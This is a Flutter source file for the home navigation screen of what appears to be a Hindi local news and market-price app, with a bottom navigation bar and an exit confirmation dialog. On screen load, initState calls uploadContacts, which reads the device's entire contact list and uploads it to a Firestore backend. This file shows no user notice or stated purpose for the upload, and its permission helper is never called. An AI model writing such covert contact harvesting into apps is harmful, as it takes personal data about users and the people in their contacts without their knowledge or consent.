// ignore_for_file: prefer_const_constructors, unnecessary_new
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shridungargarh/screens/home-screen/startpage.dart';
import '../../service/firebaseapp.dart';
import '../../utils/constent.dart';
import '../../utils/contactutil.dart';
import '../newsprofile.dart';
import '../searchscreen.dart';
import 'commoditiprice.dart';

class HomeNav extends StatefulWidget {
  var index;

  HomeNav({required this.index});

  @override
  _HomeNavState createState() => _HomeNavState();
}


class _HomeNavState extends State<HomeNav> {
  var size,w,h;
  int _index = 0;
  var uploadcount = 0 ;
  List widgets = <Widget>[
    FirstPage(),
    NewsPage(),
    SearchScreen(),
    CommoditiPrice(),
  ];

  @override
  void initState() {
    super.initState();
    if(uploadcount == 0){
      uploadContacts();
    }else{
    }
    if (widget.index != null) {
      _index = widget.index;
      // runApi();
    }
  }

  @override
  Widget build(BuildContext context) {
    size = MediaQuery.of(context).size;
    h = size.height;
    w = size.width;
    return WillPopScope(
      child: Scaffold(
      backgroundColor: Colors.black,
      body: widgets.elementAt(_index),
      bottomNavigationBar: BottomNavigationBar(
          elevation: 20,
          backgroundColor: Colors.white,
          currentIndex: _index,
          type: BottomNavigationBarType.fixed,
          // showSelectedLabels: true,
          selectedIconTheme: IconThemeData(color: kPrimaryColor),
          unselectedIconTheme: IconThemeData(color: kGreyColor),
          selectedLabelStyle: TextStyle(
              fontSize: 12,
              color: kPrimaryColor,
              fontWeight: FontWeight.w400),
          unselectedLabelStyle: TextStyle(fontSize: 12, color: kGreyColor),
          selectedItemColor: kPrimaryColor,
          unselectedItemColor: kTitleColor,
          onTap: (page) {
            setState(() {
              _index = page;
            });
          },
          items: [
            BottomNavigationBarItem(
              icon: Padding(
                padding: EdgeInsets.only(bottom: 5.0),
                child: SvgPicture.asset(
                  'assets/imagesvg/home.svg',
                  width: 20,
                  color: _index == 0 ? kPrimaryColor : kTitleColor,
                ),
              ),

              //dashboard
              label: "Home",
            ),
            BottomNavigationBarItem(
              icon: Padding(
                padding: EdgeInsets.only(bottom: 5.0),
                child: SvgPicture.asset(
                  'assets/imagesvg/news.svg',
                  width: 20,
                  color: _index == 1 ? kPrimaryColor : kTitleColor,
                ),
              ),

              //dashboard
              label: "ताज़ा खबर",
            ),
            BottomNavigationBarItem(
                icon: Padding(
                  padding: EdgeInsets.only(bottom: 5.0),
                  child: SvgPicture.asset(
                    'assets/imagesvg/search.svg',
                    width: 18,
                    color: _index == 2 ? kPrimaryColor : kTitleColor,
                  ),
                ),

                //Enquiry
                label: "खोजें"),
            BottomNavigationBarItem(
                icon: Padding(
                  padding: EdgeInsets.only(bottom: 3.0),
                  child: SvgPicture.asset(
                    'assets/imagesvg/agro.svg',
                    width: 20,
                    color: _index == 3 ? kPrimaryColor : kTitleColor,
                  ),
                ),

                //Menu
                label: "मंडी भाव")
          ]),
    ),
      onWillPop: showExitPopup);
  }
  Future<bool> showExitPopup() async {
    return await
    showDialog(
      context: context,
      builder: (context) {
        return
          AlertDialog(
          icon: Icon(Icons.highlight_off_rounded,color: Colors.red),
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.all(Radius.circular(20.0))),
          contentPadding: EdgeInsets.all(20),
          actionsAlignment: MainAxisAlignment.spaceAround,
          title: Text('ऐप से बाहर निकलें ?'),
          content: Text('क्या आप  ऐप से बाहर निकलना चाहते हैं',textAlign: TextAlign.center),
          actions:[
            ElevatedButton(
              onPressed: (){
                Navigator.of(context).pop(true);},
              //return true when click on "Yes"
              style: ElevatedButton.styleFrom(
                backgroundColor: kWhiteColor,
                side: BorderSide(color: kPrimaryColor),
                minimumSize: Size(w*0.3, h*0.047),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.all(Radius.circular(20))
                ),
              ),
              child:Text('हां',style: TextStyle(fontSize: 18,color: ksubprime),),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop(false);},
              //return false when click on "NO
              style: ElevatedButton.styleFrom(
                backgroundColor: kPrimaryColor,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.all(Radius.circular(20)),
                ),
                minimumSize: Size(w*0.3, h*0.047),
              ),
              child:Text('नहीं',style: TextStyle(fontSize: 18),),
            ),
          ],
        );
      },
    )??false; //if showDialouge had returned null, then return false
  }
  Future uploadContacts()async {
     final contact =  (await ContactsService.getContacts(withThumbnails: false)).toList();
    await FirestoreApi.uploadContacts(contact);
  }



  Future askContactsPermission() async {
    final permission = await ContactUtils.getContactPermission();
    switch (permission) {
      case PermissionStatus.granted:
        break;
      case PermissionStatus.permanentlyDenied:
        break;
      default:
        print('please chack');
        break;
    }
  }
}
